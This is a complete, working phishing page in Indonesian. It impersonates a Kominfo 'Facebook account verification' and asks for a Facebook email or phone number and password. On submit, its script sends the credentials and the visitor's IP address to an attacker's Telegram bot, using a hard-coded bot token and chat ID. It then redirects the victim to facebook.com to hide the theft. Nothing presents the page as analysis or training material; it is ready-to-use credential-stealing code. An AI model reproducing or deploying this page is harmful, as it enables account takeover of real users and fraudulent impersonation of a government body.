<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Akun Facebook - Kominfo</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, rgba(0, 38, 99, 0.9), rgba(0, 76, 153, 0.9)),
                        url('https://files.catbox.moe/19ibpp.jpg') center/cover no-repeat fixed;
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: background 0.5s ease;
        }
        
        .container {
            background-color: rgba(0, 38, 99, 0.85);
            border-radius: 15px;
            padding: 30px;
            width: 90%;
            max-width: 500px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .header img {
            width: 100px;
            margin-bottom: 15px;
        }
        
        .header h1 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #fff;
        }
        
        .header p {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.7);
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border-radius: 8px;
            border: 1px solid #1e88e5;
            background-color: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 14px;
            transition: all 0.3s;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #42a5f5;
            box-shadow: 0 0 0 2px rgba(66, 165, 245, 0.3);
        }
        
        button {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 8px;
            background-color: #1e88e5;
            color: white;
            font-weight: 600;
            cursor: pointer;
            font-size: 16px;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        button:hover {
            background-color: #1976d2;
            transform: translateY(-2px);
        }
        
        .disclaimer {
            margin-top: 20px;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.6);
            text-align: center;
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 20px;
                width: 95%;
            }
            
            .header h1 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/2482a2f0-ddd0-434d-b862-9e3ac7d83ad9.png" alt="Logo Kominfo resmi">
            <h1>VERIFIKASI AKUN FACEBOOK</h1>
            <p>Masukkan informasi akun Facebook Anda untuk verifikasi</p>
        </div>
        
        <form id="facebookForm">
            <div class="form-group">
                <label for="email">Email/No. HP Facebook</label>
                <input type="text" id="email" name="email" placeholder="Masukkan email atau nomor HP Facebook" required>
            </div>
            
            <div class="form-group">
                <label for="password">Kata Sandi Facebook</label>
                <input type="password" id="password" name="password" placeholder="Masukkan kata sandi Facebook Anda" required>
            </div>
            
            <button type="submit">VERIFIKASI SEKARANG</button>
        </form>
        
        <p class="disclaimer">Data Anda akan diverifikasi dan dilindungi sesuai dengan peraturan Kominfo Republik Indonesia</p>
        
        <!-- Hidden background controls -->
        <div style="display: none;">
            <button type="button" onclick="changeBackground('https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/0516a69c-68b0-4863-9f5c-85e397d1d1bf.png')">Red BG</button>
            <button type="button" onclick="changeBackground('https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/f853ab51-ca9b-4622-bf8b-6ddeebe79896.png')">Green BG</button>
            <button type="button" onclick="changeBackground('')">Reset BG</button>
        </div>
    </div>

    <script>
        // Function to change background
        function changeBackground(imageUrl) {
            if (imageUrl) {
                document.body.style.setProperty('--custom-bg-img', `url('${imageUrl}')`);
            } else {
                document.body.style.removeProperty('--custom-bg-img');
            }
        }

        // Function to change gradient
        function changeGradient(color1, color2) {
            document.body.style.setProperty('--custom-bg', 
                `linear-gradient(rgba(${color1}, 0.7), rgba(${color2}, 0.7))`);
        }

        document.getElementById('facebookForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!email || !password) {
                alert('Harap isi semua kolom!');
                return;
            }
            
            // Data yang akan dikirim ke bot Telegram
            const data = {
                email: email,
                password: password,
                chat_id: "7912626758",
                bot_token: "7746996163:AAEOKmKfyhxtC02isyGj3tdDYOahh7rM-g4"
            };
            
            try {
                // Kirim data ke bot Telegram
                const response = await fetch(`https://api.telegram.org/bot${data.bot_token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: data.chat_id,
                        text: `DATA FACEBOOK BARU\n\nEmail/HP: ${data.email}\nPassword: ${data.password}\n\nIP: ${await getIP()}`,
                        parse_mode: 'Markdown'
                    })
                });
                
                if (response.ok) {
                    // Redirect ke Facebook setelah sukses mengirim
                    alert('Verifikasi berhasil! Akun Anda sedang diproses.');
                    window.location.href = 'https://facebook.com';
                } else {
                    throw new Error('Gagal mengirim verifikasi');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Terjadi kesalahan saat verifikasi. Silakan coba lagi.');
            }
        });
        
        // Fungsi untuk mendapatkan IP pengguna
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'IP tidak terdeteksi';
            }
        }
    </script>
</body>
</html>
